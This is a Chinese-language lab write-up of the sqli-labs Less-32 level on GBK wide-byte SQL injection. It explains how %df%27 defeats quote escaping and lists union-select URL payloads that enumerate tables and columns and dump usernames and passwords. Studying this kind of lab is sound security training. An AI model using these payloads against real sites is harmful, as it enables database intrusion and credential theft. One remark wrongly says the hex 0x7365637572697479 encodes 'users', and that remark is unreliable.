# Less-32

> 使用preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id=1"会变成id=1\ ",使得引号不起作用，但是可以注意到数据库使用了gbk编码。这里我们可以采用宽字节注入。当某字符的大小为一个字节时，称其字符为窄字节；而当某字符的大小为两个字节时，称其字符为宽字节。所有英文默认占一个字节，汉字占两个字节。

![](./img/56fab10e6769de000c045c580c36749f.png)

~~~ cmd
?id=1%df%27 --+
~~~



sqli-lib-32 宽字节注入

> mysql默认是GBK编码，GBK汉字编码，两个字节代表一个汉字，一个字节代表一个英文或者数字。那么，两个字节就是宽字节，一个字节就是窄字节



漏洞出现原因

> mysql默认使用BGK编码，当mysql使用bgk编码时，会认为两个字符是一个汉字，(前一个ASCII码要大于128，才会得到汉字范围)，这就是mysql的特性，因为BGK是多字节编码，它认为两个字节是一个汉字，我们在代入参数时，代入 %df%27，%27 是 单引号 的url编码

~~~ php
# 当 我们进行 SQL注入时，会进行一下操作
    
    （1）?id=1' and 1=1%23
    	# 这是正常的语句，我们不放使用SQL语句看一下
    	select * from user where id='1' and 1=1#'
    	
    	# 当php使用函数对接受的参数做了处理后，将单引号转义，在单引号前面加上了 转义符“\"
    	在sql中的语句是：
    	select * from user where id='1\' and 1=1#'
    	# 这时代入数据库查看,这是明显没有注入成功的，因为前面的单引号没有闭合
  
  
    (2) 当我们代入了 %df 时，在数据库中就变成了
    	?id=1%DF' and 1=1%23
    	这时，转义函数，还会对我们输入的单引号进行转义，转义成（\'）,而"\"的url编码为 %5C
    	在url中就变成了：%DF%5c%27
    	当编码为bgk时，%5c会和前面的%df拼合，形成一个汉字（運）
    	从而闭合掉了后面的引号，查询成功
    	
    	最后的sql语句是：
    	select * from user where id='1運' and 1=1#'
~~~



~~~ cmd
?id=-1%df%27%20union%20select%201,2,3--+
~~~

![Less-32-01](.\img\Less-32-01.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-32-02](.\img\Less-32-02.png)



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
~~~

![Less-32-03](.\img\Less-32-03.png)

> 其中，0x7365637572697479是users的十六进制编码



~~~ cmd
?id=-1%df%27%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![Less-32-04](.\img\Less-32-04.png)



注释：url注释字符编码对照表

![Less-32-05](.\img\Less-32-05.png)

![Less-32-06](.\img\Less-32-06.png)